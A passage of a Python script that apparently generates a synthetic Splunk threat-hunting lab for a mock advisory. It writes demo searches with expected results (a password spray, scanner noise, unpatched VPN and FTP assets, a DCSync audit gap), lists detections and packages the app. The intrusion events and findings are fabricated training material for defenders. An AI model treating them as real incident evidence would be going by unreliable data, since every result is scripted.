                    f"encode their input. {NET_SCANNER} tries one old Bash exploit twice: everyday internet noise. {VULN_SCANNER} is "
                    "the approved scanner checking for the same CVEs on Sundays."),
        "AA26 31": (["cve", "asset", "attempted_by", "telemetry", "priority"], exp["advisory_cves"],
                    "Five of the eight CVEs are on assets we own. VPN01 (Pulse Secure) and FTP01 (ProFTPD) are internet-facing and the "
                    "actor scanned them: patch now. None of the five vulnerable assets sends logs, so an exploit against them would be "
                    "invisible; the attempts we can see hit the web server. The FTP and DNS CVEs can never appear in a web log."),
        "AA26 28": ([], [], "Zero results. The draft assumed fields this data does not have: src_ip (the IIS field is c_ip) and "
                    "action=failure (in this data action is only allowed or blocked). Filtering on sc_status=401 and grouping by c_ip finds the spray: 64 users, 104 failures from 203.0.113.47."),
    }
    for s in SEARCHES:
        key = s["name"][:7]
        cols, rows, note = expect[key]
        a(f"### {s['name']} ({s['slide']})\n")
        a(s["title"] + ("" if s["title"].endswith("?") else ".") + "\n")
        a(f"```\n{s['spl']}\n```\n")
        a("**Expected:** " + note + "\n")
        if cols is not None:
            table(cols, rows)
    a("## 4. Base detections monitoring for this adversary\n")
    a(f"The Integrity Tech Detections app (`integrity_tech_detections`) installs {len(DETECTIONS) + 1} Enterprise Security detections, enabled and scheduled. They find nothing in the lab data "
      "because it is historical; they watch for the same behaviour from now on. Each one writes risk to the user or system involved "
      "(an intermediate finding), and **Integrity Tech behaviour chain** raises a finding when one entity reaches risk 100 across "
      "three ATT&CK tactics. Change the `aa26_iis` and `aa26_o365` macros, and the `aa26_approved_scanners` lookup, to fit your "
      "environment.\n")
    a("`python3 labctl.py backtest` runs every detection over the scenario window without its actions and checks the row count "
      "below. Nothing is written to the risk index.\n")
    rows = []
    for d in DETECTIONS + [dict(THRESHOLD, risk=[], mitre=[], cron="30 * * * *")]:
        rows.append({"detection": f"AA26-281A - {d['name']} - Rule", "ATT&CK": ", ".join(d["mitre"]),
                     "risk to": ", ".join(f"{f} +{s}" for f, _, s in d["risk"]) or "raises a finding",
                     "runs": d["cron"], "backtest rows": exp["backtest"][d["name"]]})
    table(["detection", "ATT&CK", "risk to", "runs", "backtest rows"], rows)
    a("DCSync returns nothing in the lab because the replication audit SACL was never set: the gap is the finding.\n")
    path.write_text("\n".join(w))


def package(path):
    path.parent.mkdir(exist_ok=True)
    with tarfile.open(path, "w:gz") as tar:
        tar.add(APP, arcname=APP.name, filter=lambda ti: None if "__pycache__" in ti.name or ti.name.endswith(".DS_Store") else ti)


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--day0", default="2026-09-28", help="date of the scan, spray and initial access (default 2026-09-28)")
    ap.add_argument("--hunt", default="2026-10-08T09:00", help="end of the data: the moment the advisory lands")
    ap.add_argument("--tz", default="Australia/Sydney", help="scenario time zone (default Australia/Sydney)")
    ap.add_argument("--seed", type=int, default=28101, help="random seed; the same seed gives identical data")
    args = ap.parse_args()

    day0 = dt.date.fromisoformat(args.day0)
    hunt = dt.datetime.fromisoformat(args.hunt)
    if hunt.date() < day0 + dt.timedelta(days=5):
        ap.error("--hunt must be at least five days after --day0 so the whole scenario fits")
    lab = Lab(day0, hunt, args.tz, args.seed)
    lab.background()
    lab.intrusion()
    lab.legit_softether()
    lab.exploitation()
    lab.write_context_lookups()
    lab.seed_risk()
    out = HERE / "output"
    manifest = lab.write(out)
    exp = expected(lab)
    (out / "expected.json").write_text(json.dumps(exp, indent=2, default=str))
    write_saved_searches(lab, APP / "default" / "savedsearches.conf")
    write_inputs(manifest, APP / "default" / "inputs.conf")
    write_demo_doc(lab, exp, manifest, HERE / "DEMO_SEARCHES.md")
    package(HERE / "dist" / f"{APP.name}.tgz")
    total = sum(m["events"] for m in manifest)
    print(f"Window {lab.start:%Y-%m-%d %H:%M} to {lab.end:%Y-%m-%d %H:%M} {args.tz}; {total:,} events in {len(manifest)} files")
    for m in manifest:
        print(f"  {m['index']:<12} {m['sourcetype']:<26} {m['events']:>8,}  {m['file']}")
    print(f"App package: dist/{APP.name}.tgz ({(HERE / 'dist' / f'{APP.name}.tgz').stat().st_size / 1e6:.1f} MB)")
    print("Searches and expected results: DEMO_SEARCHES.md")


if __name__ == "__main__":
    main()
